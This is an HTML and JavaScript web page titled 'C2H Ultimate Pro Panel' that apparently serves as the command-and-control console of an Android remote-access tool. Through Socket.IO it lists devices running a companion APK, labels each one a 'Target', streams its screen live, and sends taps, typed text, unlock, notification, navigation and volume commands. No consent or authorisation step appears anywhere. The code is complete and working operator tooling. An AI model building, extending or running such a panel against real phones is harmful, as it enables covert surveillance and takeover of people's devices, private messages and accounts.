<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>C2H Ultimate Pro Panel</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #080808; font-family: 'Inter', sans-serif; color: white; }
        .hidden { display: none !important; }
        
        #device-list-view { height: 100vh; display: flex; flex-direction: column; padding: 20px; background: radial-gradient(circle at top, #1e293b, #050505); }
        .device-card { background: rgba(30, 41, 59, 0.4); backdrop-filter: blur(10px); border: 1px solid #1e293b; padding: 18px; border-radius: 20px; margin-bottom: 12px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: space-between; }
        .device-card:active { transform: scale(0.96); background: rgba(59, 130, 246, 0.2); border-color: #3b82f6; }
        
        .app-container { display: flex; flex-direction: column; height: 100vh; width: 100vw; }
        .main-content { display: flex; flex: 1; overflow: hidden; }
        
        .side-controls { width: 75px; background: #000; display: flex; flex-direction: column; align-items: center; gap: 12px; padding: 15px 0; border-right: 1px solid #111; z-index: 50; overflow-y: auto; }
        .side-btn { width: 50px; height: 50px; border-radius: 15px; background: #111; display: flex; align-items: center; justify-content: center; transition: all 0.2s; font-size: 20px; color: #666; border: 1px solid #222; cursor: pointer; }
        .side-btn:active { transform: scale(0.85); background: #3b82f6; color: white; border-color: #3b82f6; }
        
        .screen-view { flex: 1; position: relative; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; padding: 10px; }
        .phone-frame { position: relative; max-width: 100%; max-height: 100%; display: flex; flex-direction: column; align-items: center; border-radius: 35px; background: #000; }
        #live-screen { max-width: 100%; max-height: calc(100vh - 200px); object-fit: contain; border-radius: 25px; cursor: crosshair; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        
        .android-nav { width: 100%; height: 60px; background: #000; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222; margin-top: 8px; border-radius: 0 0 25px 25px; }
        .nav-icon { color: #666; font-size: 22px; padding: 15px 25px; transition: 0.2s; cursor: pointer; }
        .nav-icon:active { color: #3b82f6; transform: scale(1.2); }

        .bottom-bar { height: 90px; background: #000; display: flex; align-items: center; padding: 0 20px; gap: 12px; border-top: 1px solid #111; }
        .type-input { flex: 1; background: #111; border: 1px solid #222; border-radius: 12px; padding: 12px 18px; color: white; outline: none; font-size: 15px; }
        .type-input:focus { border-color: #3b82f6; }
        .send-btn { background: #3b82f6; color: white; width: 55px; height: 45px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; }

        .top-info { position: absolute; top: 20px; left: 95px; right: 20px; display: flex; justify-content: space-between; pointer-events: none; z-index: 40; }
        .badge { background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(10px); padding: 6px 14px; border-radius: 20px; font-size: 12px; border: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #10b981; box-shadow: 0 0 10px #10b981; animation: pulse 2s infinite; }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .toast-notification {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.9);
            color: white;
            padding: 10px 20px;
            border-radius: 10px;
            font-size: 14px;
            z-index: 9999;
            pointer-events: none;
            animation: fadeOut 2s ease-in-out forwards;
        }
        
        @keyframes fadeOut {
            0% { opacity: 1; }
            70% { opacity: 1; }
            100% { opacity: 0; visibility: hidden; }
        }
    </style>
</head>
<body>

    <div id="device-list-view">
        <h1 class="text-3xl font-bold mb-10 flex items-center gap-4 text-white/90">
            <i class="fas fa-microchip text-blue-500"></i> C2H Control
        </h1>
        <div id="devices-container" class="flex-1 overflow-y-auto pr-2">
            <p class="text-slate-500 text-center mt-20">Scanning network...</p>
        </div>
    </div>

    <div id="control-view" class="app-container hidden">
        <div class="main-content">
            <div class="side-controls">
                <button onclick="goBackToList()" class="side-btn text-yellow-500"><i class="fas fa-list-ul"></i></button>
                <div class="w-10 h-px bg-zinc-900 my-1"></div>
                <button onclick="sendCommand('unlock_device')" class="side-btn text-blue-400"><i class="fas fa-power-off"></i></button>
                <button onclick="sendCommand('notifications')" class="side-btn"><i class="fas fa-bell"></i></button>
                <button onclick="sendQuickSettings()" class="side-btn"><i class="fas fa-sliders-h"></i></button>
                <div class="w-10 h-px bg-zinc-900 my-1"></div>
                <!-- FIXED SCROLL BUTTONS - Pure scroll only -->
                <button onclick="sendScroll('up')" class="side-btn" style="color: #3b82f6;"><i class="fas fa-arrow-up"></i></button>
                <button onclick="sendScroll('down')" class="side-btn" style="color: #3b82f6;"><i class="fas fa-arrow-down"></i></button>
                <button onclick="sendScroll('left')" class="side-btn" style="color: #3b82f6;"><i class="fas fa-arrow-left"></i></button>
                <button onclick="sendScroll('right')" class="side-btn" style="color: #3b82f6;"><i class="fas fa-arrow-right"></i></button>
                <div class="w-10 h-px bg-zinc-900 my-1"></div>
                <!-- FIXED VOLUME BUTTONS -->
                <button onclick="sendVolumeUp()" class="side-btn" style="color: #10b981;"><i class="fas fa-volume-up"></i></button>
                <button onclick="sendVolumeDown()" class="side-btn" style="color: #ef4444;"><i class="fas fa-volume-down"></i></button>
            </div>

            <div class="screen-view">
                <div class="top-info">
                    <div class="badge"><div class="status-dot"></div> <span id="info-model">Target</span></div>
                    <div class="badge"><i class="fas fa-battery-half text-green-500"></i> <span id="info-battery">--%</span></div>
                </div>

                <div class="phone-frame">
                    <img id="live-screen" src="https://via.placeholder.com/1080x1920/111?text=Connecting..." alt="Screen">
                    
                    <div class="android-nav">
                        <button onclick="sendGlobal('back')" class="nav-icon"><i class="fas fa-chevron-left"></i></button>
                        <button onclick="sendGlobal('home')" class="nav-icon"><i class="fas fa-circle"></i></button>
                        <button onclick="sendGlobal('recents')" class="nav-icon"><i class="fas fa-square"></i></button>
                    </div>
                </div>
            </div>
        </div>

        <div class="bottom-bar">
            <input type="text" id="type-box" class="type-input" placeholder="Type text to phone...">
            <button onclick="handleType()" class="send-btn"><i class="fas fa-paper-plane"></i></button>
        </div>
    </div>

    <script>
        const socket = io({
            transports: ['polling', 'websocket'],
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 1000
        });
        
        const screenImg = document.getElementById('live-screen');
        const typeBox = document.getElementById('type-box');
        let currentTargetId = null;
        let screenW = 1080, screenH = 1920;

        function showToast(message) {
            const toast = document.createElement('div');
            toast.className = 'toast-notification';
            toast.innerText = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 2000);
        }

        socket.on('devices_list', (devices) => {
            const container = document.getElementById('devices-container');
            if (!devices || devices.length === 0) {
                container.innerHTML = '<div class="text-center mt-20 text-slate-500">⚡ No active devices<br><span class="text-xs">Make sure APK is running</span></div>';
                return;
            }
            container.innerHTML = devices.map(dev => `
                <div class="device-card" onclick="selectDevice('${dev.deviceId}', '${dev.deviceName}')">
                    <div class="flex items-center gap-4">
                        <div class="w-14 h-14 rounded-2xl bg-zinc-900 flex items-center justify-center border border-zinc-800">
                            <i class="fas fa-mobile-alt text-2xl text-blue-500"></i>
                        </div>
                        <div>
                            <div class="font-bold text-lg text-white/90">${dev.deviceName || 'Android Device'}</div>
                            <div class="text-xs text-zinc-500 font-mono">${dev.deviceId.substring(0, 8)}...</div>
                        </div>
                    </div>
                    <div class="text-right">
                        <span class="text-[10px] text-green-500 font-bold uppercase tracking-tighter">● LIVE</span>
                        <div class="text-sm mt-1 text-zinc-400 font-bold">${dev.battery || '--'}%</div>
                    </div>
                </div>
            `).join('');
        });

        function selectDevice(id, name) {
            currentTargetId = id;
            document.getElementById('info-model').innerHTML = `<i class="fas fa-mobile-alt mr-1"></i> ${name}`;
            document.getElementById('device-list-view').classList.add('hidden');
            document.getElementById('control-view').classList.remove('hidden');
            socket.emit('panel_command', { targetId: id, type: 'start_live_stream', data: {} });
            showToast(`✅ Connected to ${name}`);
        }

        function goBackToList() {
            document.getElementById('control-view').classList.add('hidden');
            document.getElementById('device-list-view').classList.remove('hidden');
            currentTargetId = null;
        }

        socket.on('live_screen_update', (data) => {
            if (data.deviceId === currentTargetId && data.liveImage) {
                screenImg.src = 'data:image/jpeg;base64,' + data.liveImage;
                if (data.screenWidth) screenW = data.screenWidth;
                if (data.screenHeight) screenH = data.screenHeight;
            }
        });

        socket.on('status_update', (data) => {
            if (data.deviceId === currentTargetId && data.battery) {
                document.getElementById('info-battery').innerHTML = `${data.battery}%`;
            }
        });

        screenImg.addEventListener('click', (e) => {
            if (!currentTargetId) return;
            const rect = screenImg.getBoundingClientRect();
            let x = Math.round(((e.clientX - rect.left) / rect.width) * screenW);
            let y = Math.round(((e.clientY - rect.top) / rect.height) * screenH);
            x = Math.max(0, Math.min(screenW, x));
            y = Math.max(0, Math.min(screenH, y));
            socket.emit('panel_command', { targetId: currentTargetId, type: 'touch_command', data: { x, y } });
            showToast(`🖱️ Tap at ${x},${y}`);
        });

        function sendCommand(type) {
            if (!currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: type, data: {} });
            showToast(`📡 Command: ${type}`);
        }
        
        function sendQuickSettings() {
            if (!currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: 'quick_settings', data: {} });
            showToast(`⚙️ Opening Quick Settings`);
        }

        function sendGlobal(action) {
            if (!currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: 'global_action', data: { action } });
            const actionNames = { back: '◀ Back', home: '⚫ Home', recents: '□ Recents' };
            showToast(`${actionNames[action] || action}`);
        }

        function sendScroll(direction) {
            if (!currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: 'scroll_action', data: { direction } });
            const dirNames = { up: '⬆ Scroll Up', down: '⬇ Scroll Down', left: '⬅ Scroll Left', right: '➡ Scroll Right' };
            showToast(`${dirNames[direction]}`);
        }
        
        function sendVolumeUp() {
            if (!currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: 'volume_up', data: {} });
            showToast(`🔊 Volume +`);
        }
        
        function sendVolumeDown() {
            if (!currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: 'volume_down', data: {} });
            showToast(`🔉 Volume -`);
        }

        function handleType() {
            const text = typeBox.value.trim();
            if (!text || !currentTargetId) return;
            socket.emit('panel_command', { targetId: currentTargetId, type: 'type_text', data: { text } });
            showToast(`⌨ Typing: ${text.substring(0, 20)}${text.length > 20 ? '...' : ''}`);
            typeBox.value = '';
        }

        typeBox.addEventListener('keypress', (e) => { if(e.key === 'Enter') handleType(); });
        
        // Connection status
        socket.on('connect', () => showToast('🟢 Connected to server'));
        socket.on('disconnect', () => showToast('🔴 Disconnected from server'));
        socket.on('error', (err) => showToast(`⚠ ${err.message}`));
    </script>
</body>
</html>
